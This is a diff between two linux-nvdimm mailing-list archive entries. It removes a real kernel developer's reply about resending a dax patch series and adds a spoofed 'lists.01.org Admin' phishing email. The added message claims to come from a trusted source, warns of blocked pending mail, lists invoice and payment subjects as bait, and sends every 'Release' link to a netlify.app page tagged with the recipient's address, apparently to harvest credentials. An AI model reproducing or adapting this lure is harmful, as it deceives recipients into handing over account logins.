@@ -2,102 +2,396 @@ Return-Path: <linux-nvdimm-bounces@lists.01.org>
 X-Original-To: lists+linux-nvdimm@lfdr.de
 Delivered-To: lists+linux-nvdimm@lfdr.de
 Received: from ml01.01.org (ml01.01.org [IPv6:2001:19d0:306:5::1])
-	by mail.lfdr.de (Postfix) with ESMTPS id 297263687AD
-	for <lists+linux-nvdimm@lfdr.de>; Thu, 22 Apr 2021 22:07:58 +0200 (CEST)
+	by mail.lfdr.de (Postfix) with ESMTPS id 9A7333688AE
+	for <lists+linux-nvdimm@lfdr.de>; Thu, 22 Apr 2021 23:40:00 +0200 (CEST)
 Received: from ml01.vlan13.01.org (localhost [IPv6:::1])
-	by ml01.01.org (Postfix) with ESMTP id 5DA2E100EAB7F;
-	Thu, 22 Apr 2021 13:07:56 -0700 (PDT)
-Received-SPF: Pass (mailfrom) identity=mailfrom; client-ip=170.10.133.124; helo=us-smtp-delivery-124.mimecast.com; envelope-from=vgoyal@redhat.com; receiver=<UNKNOWN> 
-Received: from us-smtp-delivery-124.mimecast.com (us-smtp-delivery-124.mimecast.com [170.10.133.124])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by ml01.01.org (Postfix) with ESMTPS id EB537100EC1D5
-	for <linux-nvdimm@lists.01.org>; Thu, 22 Apr 2021 13:07:53 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=redhat.com;
-	s=mimecast20190719; t=1619122072;
-	h=from:from:reply-to:subject:subject:date:date:message-id:message-id:
-	 to:to:cc:cc:mime-version:mime-version:content-type:content-type:
-	 in-reply-to:in-reply-to:references:references;
-	bh=R+hZdBQQle+5F2SpSAhi/uqo7A+r/YVViB1bDRhu/Gc=;
-	b=GoPTCebweoAUXd5uoZ9fdB3/1nqBDwnnAw7cAuF0KtituTijHHDDj22qN8dj83ReG+I7u9
-	+HP3Pm3yMB8fCBhLV7xPMliljjgrH5Ju8F4fAuqgAZbtgru5yG9zaQRqQWgceyxpTMy21l
-	lzxzTlMPtFqmRoJuvddyJRuPeX7MlGU=
-Received: from mimecast-mx01.redhat.com (mimecast-mx01.redhat.com
- [209.132.183.4]) (Using TLS) by relay.mimecast.com with ESMTP id
- us-mta-58-TEk5jmxrPV2ZVunGxe5gUw-1; Thu, 22 Apr 2021 16:07:48 -0400
-X-MC-Unique: TEk5jmxrPV2ZVunGxe5gUw-1
-Received: from smtp.corp.redhat.com (int-mx01.intmail.prod.int.phx2.redhat.com [10.5.11.11])
-	(using TLSv1.2 with cipher AECDH-AES256-SHA (256/256 bits))
-	(No client certificate requested)
-	by mimecast-mx01.redhat.com (Postfix) with ESMTPS id 6ABAD107ACF3;
-	Thu, 22 Apr 2021 20:07:47 +0000 (UTC)
-Received: from horse.redhat.com (ovpn-116-206.rdu2.redhat.com [10.10.116.206])
-	by smtp.corp.redhat.com (Postfix) with ESMTP id 70E8563BA7;
-	Thu, 22 Apr 2021 20:07:43 +0000 (UTC)
-Received: by horse.redhat.com (Postfix, from userid 10451)
-	id EEFEB220BCF; Thu, 22 Apr 2021 16:07:42 -0400 (EDT)
-Date: Thu, 22 Apr 2021 16:07:42 -0400
-From: Vivek Goyal <vgoyal@redhat.com>
-To: Dan Williams <dan.j.williams@intel.com>
-Subject: Re: [Virtio-fs] [PATCH v3 2/3] dax: Add a wakeup mode parameter to
- put_unlocked_entry()
-Message-ID: <20210422200742.GG1627633@redhat.com>
-References: <20210419213636.1514816-1-vgoyal@redhat.com>
- <20210419213636.1514816-3-vgoyal@redhat.com>
- <20210420093420.2eed3939@bahia.lan>
- <20210420140033.GA1529659@redhat.com>
- <CAPcyv4g2raipYhivwbiSvsHmSdgLO8wphh5dhY3hpjwko9G4Hw@mail.gmail.com>
- <20210422062458.GA4176641@infradead.org>
- <CAPcyv4h42yPKmWByBVkjgL_0LjBg3ZNYKLBJKgjixsdTzOpaiA@mail.gmail.com>
+	by ml01.01.org (Postfix) with ESMTP id EE270100EAAE1;
+	Thu, 22 Apr 2021 14:39:58 -0700 (PDT)
+Received-SPF: Softfail (mailfrom) identity=mailfrom; client-ip=198.23.206.55; helo=198-23-206-55-host.colocrossing.com; envelope-from=davidliu@aplus-inno.com; receiver=<UNKNOWN> 
+Received: from 198-23-206-55-host.colocrossing.com (unknown [198.23.206.55])
+	by ml01.01.org (Postfix) with ESMTP id 31DB1100EAB7C
+	for <linux-nvdimm@lists.01.org>; Thu, 22 Apr 2021 14:39:50 -0700 (PDT)
+From: lists.01.org Admin <davidliu@aplus-inno.com>
+To: linux-nvdimm@lists.01.org
+Subject: Pending Undelivered Mail to linux-nvdimm@lists.01.org  #9901
+Date: 22 Apr 2021 23:39:38 +0200
+Message-ID: <20210422233856.73F650559BDB0021@aplus-inno.com>
 MIME-Version: 1.0
-Content-Disposition: inline
-In-Reply-To: <CAPcyv4h42yPKmWByBVkjgL_0LjBg3ZNYKLBJKgjixsdTzOpaiA@mail.gmail.com>
-X-Scanned-By: MIMEDefang 2.79 on 10.5.11.11
-Message-ID-Hash: Z6FTWYU2VZM3AZNBAKOV5F52A4BCP4SC
-X-Message-ID-Hash: Z6FTWYU2VZM3AZNBAKOV5F52A4BCP4SC
-X-MailFrom: vgoyal@redhat.com
-X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation; nonmember-moderation; administrivia; implicit-dest; max-recipients; max-size; news-moderation; no-subject; suspicious-header
-CC: Christoph Hellwig <hch@infradead.org>, Greg Kurz <groug@kaod.org>, linux-fsdevel <linux-fsdevel@vger.kernel.org>, Jan Kara <jack@suse.cz>, Matthew Wilcox <willy@infradead.org>, linux-nvdimm <linux-nvdimm@lists.01.org>, Miklos Szeredi <miklos@szeredi.hu>, Linux Kernel Mailing List <linux-kernel@vger.kernel.org>, virtio-fs-list <virtio-fs@redhat.com>
+Message-ID-Hash: 4UW5OEIEMGJJLG3RWEVED6X2YQOXEMW3
+X-Message-ID-Hash: 4UW5OEIEMGJJLG3RWEVED6X2YQOXEMW3
+X-MailFrom: davidliu@aplus-inno.com
+X-Mailman-Rule-Hits: nonmember-moderation
+X-Mailman-Rule-Misses: dmarc-mitigation; no-senders; approved; emergency; loop; banned-address; member-moderation
 X-Mailman-Version: 3.1.1
 Precedence: list
 List-Id: "Linux-nvdimm developer list." <linux-nvdimm.lists.01.org>
-Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/Z6FTWYU2VZM3AZNBAKOV5F52A4BCP4SC/>
+Archived-At: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/message/4UW5OEIEMGJJLG3RWEVED6X2YQOXEMW3/>
 List-Archive: <https://lists.01.org/hyperkitty/list/linux-nvdimm@lists.01.org/>
 List-Help: <mailto:linux-nvdimm-request@lists.01.org?subject=help>
 List-Post: <mailto:linux-nvdimm@lists.01.org>
 List-Subscribe: <mailto:linux-nvdimm-join@lists.01.org>
 List-Unsubscribe: <mailto:linux-nvdimm-leave@lists.01.org>
+Content-Type: multipart/mixed; boundary="===============6778896051545974564=="
+
+--===============6778896051545974564==
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.=
+w3.org/TR/html4/loose.dtd">
+
+<html><head>
+<meta name=3D"GENERATOR" content=3D"MSHTML 11.00.9600.19597">
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body style=3D"margin: 0.5em;">
+<p>
+<table style=3D'width: 1285px; height: 36px; color: rgb(51, 51, 51); text-t=
+ransform: none; line-height: 1.6em; text-indent: 0px; letter-spacing: norma=
+l; font-family: "times new roman"; font-size: 14px; font-style: normal; fon=
+t-weight: 400; word-spacing: 0px; white-space: normal; border-collapse: col=
+lapse; orphans: 2; widows: 2; background-color: rgb(238, 238, 238); font-va=
+riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
+th: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>
+<tbody>
+<tr>
+<th style=3D"padding: 3px; border: 0px solid rgb(0, 0, 0); width: 1px; colo=
+r: white; line-height: 1.666; font-family: arial, verdana, sans-serif; back=
+ground-color: rgb(2, 151, 64);"></th>
+<td style=3D"margin: 0px; padding: 3px; border: 0px solid rgb(0, 0, 0); lin=
+e-height: 1.666; font-family: arial, verdana, sans-serif; background-color:=
+ rgb(243, 255, 248);">
+<div style=3D"padding-top: 0px; border-top-width: 0px;"><span style=3D"font=
+-family: arial, helvetica, sans-serif;"><span style=3D"font-size: 12px;">Th=
+is&#8201;email&#8201;&#953;s&#8201;from&#8201;a&#8201;trusted&#8201;s&#959;=
+urce.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Time: 4/22/2021 11:38:56 p.=
+m.</span></span></div></td></tr></tbody></table>
+<font color=3D"#0000ff" style=3D"text-transform: none; text-indent: 0px; le=
+tter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-size:=
+ small; font-style: normal; font-weight: 400; word-spacing: 0px; white-spac=
+e: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); fon=
+t-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke=
+-width: 0px; text-decoration-thickness: initial; text-decoration-style: ini=
+tial; text-decoration-color: initial;">
+<font color=3D"#0fa9f0">
+<font color=3D"#175ee8" size=3D"5"><br><strong>Blocked incoming messages fo=
+r<span>&nbsp;linux-nvdimm@lists.01.org</span></strong></font></font><br><br=
+><strong><font size=3D"4">Delivery has failed to these recipients or groups=
+:</font></strong></font>
+ <br style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0p=
+x; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-=
+size: small; font-style: normal; font-weight: 400; word-spacing: 0px; white=
+-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255)=
+; font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-s=
+troke-width: 0px; text-decoration-thickness: initial; text-decoration-style=
+: initial; text-decoration-color: initial;">
+<font size=3D"4" style=3D"color: rgb(34, 34, 34); text-transform: none; tex=
+t-indent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-=
+serif; font-style: normal; font-weight: 400; word-spacing: 0px; white-space=
+: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font=
+-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-=
+width: 0px; text-decoration-thickness: initial; text-decoration-style: init=
+ial; text-decoration-color: initial;">
+You have 10 pending messages for delivery to your mail box.<br></font>
+<a style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;">
+<font size=3D"4">
+Click here to&nbsp;release these messages to your inbox folder</font></a> <=
+p></p>
+<p style=3D"color: rgb(34, 34, 34); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; font-si=
+ze: small; font-style: normal; font-weight: 400; word-spacing: 0px; white-s=
+pace: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); =
+font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
+oke-width: 0px; text-decoration-thickness: initial; text-decoration-style: =
+initial; text-decoration-color: initial;"></p>
+<div style=3D"border-width: 0px; margin: 0px; padding: 0px; width: 1168px; =
+color: rgb(34, 34, 34); text-transform: none; text-indent: 0px; letter-spac=
+ing: normal; overflow: hidden; font-family: Arial, Helvetica, sans-serif; f=
+ont-size: small; font-style: normal; font-weight: 400; word-spacing: 0px; d=
+isplay: table; white-space: normal; outline-width: 0px; outline-style: none=
+; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-variant=
+-ligatures: normal; font-variant-caps: normal;=20
+-webkit-text-stroke-width: 0px; text-decoration-thickness: initial; text-de=
+coration-style: initial; text-decoration-color: initial;">
+<table style=3D"margin: 0px; width: auto; font-family: verdana, arial, sans=
+-serif; font-size: 14px; border-spacing: 0px;" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0">
+<tbody>
+<tr>
+<th style=3D"margin: 0px; padding: 4px; color: rgb(255, 255, 255); font-wei=
+ght: normal; background-color: rgb(69, 90, 115);" colspan=3D"4"><b>failure =
+delivery messages</b></th></tr>
+<tr>
+<th style=3D"margin: 0px; padding: 4px 6px; width: 126px; font-weight: norm=
+al; vertical-align: bottom; border-top-color: rgb(170, 170, 170); border-le=
+ft-color: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px=
+; border-top-style: solid; border-left-style: solid; background-color: rgb(=
+251, 251, 251);">&nbsp;</th>
+<th style=3D"margin: 0px; padding: 4px 6px; width: 335px; font-weight: norm=
+al; vertical-align: bottom; border-top-color: rgb(170, 170, 170); border-le=
+ft-color: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px=
+; border-top-style: solid; border-left-style: solid; background-color: rgb(=
+251, 251, 251);">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">Recipient:</span></th>=
+
+<th style=3D"margin: 0px; padding: 4px 6px; width: 508px; font-weight: norm=
+al; vertical-align: bottom; border-top-color: rgb(170, 170, 170); border-le=
+ft-color: rgb(170, 170, 170); border-top-width: 1px; border-left-width: 1px=
+; border-top-style: solid; border-left-style: solid; background-color: rgb(=
+251, 251, 251);">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">Subject:</span></th>
+<th style=3D"margin: 0px; padding: 4px 6px; width: 136px; font-weight: norm=
+al; vertical-align: bottom; border-top-color: rgb(170, 170, 170); border-ri=
+ght-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 170); borde=
+r-top-width: 1px; border-right-width: 1px; border-left-width: 1px; border-t=
+op-style: solid; border-right-style: solid; border-left-style: solid; backg=
+round-color: rgb(251, 251, 251);">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">Date:</span></th></tr>=
+
+<tr>
+<td style=3D"margin: 0px; padding: 3px; width: 132px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; white-space: nowrap=
+; font-stretch: normal;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">
+<a style=3D"color: rgb(0, 102, 204); outline-width: medium; outline-style: =
+none;" href=3D"https://relaxed-jepsen-d3d9b2.netlify.app/#linux-nvdimm@list=
+s.01.org">Release</a></span></td>
+<td style=3D"margin: 0px; padding: 3px; width: 341px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">
+<table style=3D"margin: 0px; width: auto; font-family: verdana, arial, sans=
+-serif; font-size: 14px; border-spacing: 0px;" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 3px; width: 341px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">linux-nvdimm@lists.01.org</td></tr></tbody></table></td>
+<td style=3D"margin: 0px; padding: 3px; width: 514px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">
+<a style=3D"color: rgb(0, 102, 204); outline-width: medium; outline-style: =
+none;" href=3D"https://relaxed-jepsen-d3d9b2.netlify.app/#linux-nvdimm@list=
+s.01.org">Shpt Quote | Edel Grass | Netherlands | 04 Mar 2021 | Al-Rashed C=
+o</a></span></td>
+<td style=3D"margin: 0px; padding: 3px; width: 142px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-right-color: rgb(170, 170, =
+170); border-left-color: rgb(170, 170, 170); border-top-style: solid; borde=
+r-right-style: solid; border-left-style: solid; white-space: nowrap; font-s=
+tretch: normal;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">4/15/2021 12:31:59 a.m=
+=2E</span></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 3px; width: 132px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; white-space: nowrap=
+; font-stretch: normal;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">
+<a style=3D"color: rgb(0, 102, 204); outline-width: medium; outline-style: =
+none;" href=3D"https://relaxed-jepsen-d3d9b2.netlify.app/#linux-nvdimm@list=
+s.01.org">Release</a></span></td>
+<td style=3D"margin: 0px; padding: 3px; width: 341px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">
+<table style=3D"margin: 0px; width: auto; font-family: verdana, arial, sans=
+-serif; font-size: 14px; border-spacing: 0px;" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 3px; width: 341px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">linux-nvdimm@lists.01.org</td></tr></tbody></table></td>
+<td style=3D"margin: 0px; padding: 3px; width: 514px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;"><u><font color=3D"#006=
+6cc"><a href=3D"https://relaxed-jepsen-d3d9b2.netlify.app/#linux-nvdimm@lis=
+ts.01.org">
+FW: Quick Tracker _09 March - 2021 @ HRIH Payment</a></font></u></span></td=
+>
+<td style=3D"margin: 0px; padding: 3px; width: 142px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-right-color: rgb(170, 170, =
+170); border-left-color: rgb(170, 170, 170); border-top-style: solid; borde=
+r-right-style: solid; border-left-style: solid; white-space: nowrap; font-s=
+tretch: normal;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">4/15/2021 12:31:59 a.m=
+=2E</span></span></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 3px; width: 132px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; white-space: nowrap=
+; font-stretch: normal;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">
+<a style=3D"color: rgb(0, 102, 204); outline-width: medium; outline-style: =
+none;" href=3D"https://relaxed-jepsen-d3d9b2.netlify.app/#linux-nvdimm@list=
+s.01.org">Release</a></span></td>
+<td style=3D"margin: 0px; padding: 3px; width: 341px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">
+<table style=3D"margin: 0px; width: auto; font-family: verdana, arial, sans=
+-serif; font-size: 14px; border-spacing: 0px;" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 3px; width: 341px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">linux-nvdimm@lists.01.org</td></tr></tbody></table></td>
+<td style=3D"margin: 0px; padding: 3px; width: 514px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;"><u><font color=3D"#006=
+6cc"><a href=3D"https://relaxed-jepsen-d3d9b2.netlify.app/#linux-nvdimm@lis=
+ts.01.org">
+Re: REQUEST FOR PAYMENT OF OUSTANDING BALANCE</a></font></u></span></td>
+<td style=3D"margin: 0px; padding: 3px; width: 142px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-right-color: rgb(170, 170, =
+170); border-left-color: rgb(170, 170, 170); border-top-style: solid; borde=
+r-right-style: solid; border-left-style: solid; white-space: nowrap; font-s=
+tretch: normal;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">4/15/2021 12:31:59 a.m=
+=2E</span></span></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 3px; width: 132px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; white-space: nowrap=
+; font-stretch: normal;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">
+<a style=3D"color: rgb(0, 102, 204); outline-width: medium; outline-style: =
+none;" href=3D"https://relaxed-jepsen-d3d9b2.netlify.app/#linux-nvdimm@list=
+s.01.org">Release</a></span></td>
+<td style=3D"margin: 0px; padding: 3px; width: 341px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">
+<table style=3D"margin: 0px; width: auto; font-family: verdana, arial, sans=
+-serif; font-size: 14px; border-spacing: 0px;" border=3D"0" cellspacing=3D"=
+0" cellpadding=3D"0">
+<tbody>
+<tr>
+<td style=3D"margin: 0px; padding: 3px; width: 341px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">linux-nvdimm@lists.01.org</td></tr></tbody></table></td>
+<td style=3D"margin: 0px; padding: 3px; width: 514px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-left-color: rgb(170, 170, 1=
+70); border-top-style: solid; border-left-style: solid; font-stretch: norma=
+l;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;"><u><font color=3D"#006=
+6cc"><a href=3D"https://relaxed-jepsen-d3d9b2.netlify.app/#linux-nvdimm@lis=
+ts.01.org">
+RE: Update - WMCC &amp; RECC - Short Payment &amp; Full invoice</a></font><=
+/u></span></td>
+<td style=3D"margin: 0px; padding: 3px; width: 142px; line-height: 1.5; fon=
+t-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 14p=
+x; border-top-color: rgb(170, 170, 170); border-right-color: rgb(170, 170, =
+170); border-left-color: rgb(170, 170, 170); border-top-style: solid; borde=
+r-right-style: solid; border-left-style: solid; white-space: nowrap; font-s=
+tretch: normal;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;">4/15/2021 12:31:59 a.m=
+=2E</span></span></td></tr>
+<tr>
+<td style=3D"margin: 0px; padding: 4px 6px; text-align: right; line-height:=
+ 1.5; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; font-=
+size: 14px; font-stretch: normal; background-color: rgb(192, 192, 192);" co=
+lspan=3D"4">
+<span style=3D"border-width: 0px; margin: 0px; padding: 0px; vertical-align=
+: inherit; outline-width: 0px; outline-style: none;"><a style=3D"color: rgb=
+(0, 102, 204); outline-width: medium; outline-style: none;">(more...6)</a><=
+/span></td></tr></tbody></table></div>
+<p><span style=3D"color: rgb(85, 85, 85); text-transform: none; text-indent=
+: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-serif; f=
+ont-size: small; font-style: italic; font-weight: 400; word-spacing: 0px; w=
+hite-space: normal; orphans: 2; widows: 2; background-color: rgb(255, 255, =
+255); font-variant-ligatures: normal; font-variant-caps: normal; -webkit-te=
+xt-stroke-width: 0px; text-decoration-thickness: initial; text-decoration-s=
+tyle: initial; text-decoration-color: initial;">
+<font size=3D"4"><span style=3D"vertical-align: inherit;"><span style=3D"ve=
+rtical-align: inherit;"><span><span>Note: This message was sent by the syst=
+em for notification only.<span>&nbsp;</span></span></span></span><span>&nbs=
+p;</span><span style=3D"vertical-align: inherit;"><span>&nbsp;</span><span>=
+&nbsp;</span></span></span><br><br><span style=3D"vertical-align: inherit;"=
+><span style=3D"vertical-align: inherit;"><span><span>
+If this message lands in your spam folder, please move it to your inbox fol=
+der for proper integration.<br></span></span></span></span></font><span sty=
+le=3D"vertical-align: inherit;"><span style=3D"vertical-align: inherit;"><b=
+r>
+<span style=3D'color: rgb(0, 0, 0); text-transform: none; text-indent: 0px;=
+ letter-spacing: normal; font-family: "Times New Roman"; font-size: 14px; f=
+ont-style: normal; font-weight: 400; word-spacing: 0px; float: none; displa=
+y: inline; white-space: normal; background-color: rgb(255, 255, 255);'><fon=
+t size=3D"4">(c) Poweredby: IT<span>&nbsp;lists.01.org</span><span>&nbsp;</=
+span>Support.&nbsp;&nbsp;&nbsp;&nbsp; <br><em><font size=3D"1">&lt;20210422=
+233856.73F650559BDB0021@aplus-inno.com&gt;</font></em><br><br></font></span=
+></span></span>
+</span></p>
+</body></html>
+--===============6778896051545974564==
 Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
-On Thu, Apr 22, 2021 at 01:01:15PM -0700, Dan Williams wrote:
-> On Wed, Apr 21, 2021 at 11:25 PM Christoph Hellwig <hch@infradead.org> wrote:
-> >
-> > On Wed, Apr 21, 2021 at 12:09:54PM -0700, Dan Williams wrote:
-> > > Can you get in the habit of not replying inline with new patches like
-> > > this? Collect the review feedback, take a pause, and resend the full
-> > > series so tooling like b4 and patchwork can track when a new posting
-> > > supersedes a previous one. As is, this inline style inflicts manual
-> > > effort on the maintainer.
-> >
-> > Honestly I don't mind it at all.  If you shiny new tooling can't handle
-> > it maybe you should fix your shiny new tooling instead of changing
-> > everyones workflow?
-> 
-> I think asking a submitter to resend a series is par for the course,
-> especially for poor saps like me burdened by corporate email systems.
-> Vivek, if this is too onerous a request just give me a heads up and
-> I'll manually pull out the patch content from your replies.
-
-I am fine with posting new version. Initially I thought that there
-were only 1-2 minor cleanup comments so I posted inline, thinking
-it might preferred method instead of posting full patch series again.
-
-But then more comments came along. So posting another version makes
-more sense now.
-
-Thanks
-Vivek
 _______________________________________________
 Linux-nvdimm mailing list -- linux-nvdimm@lists.01.org
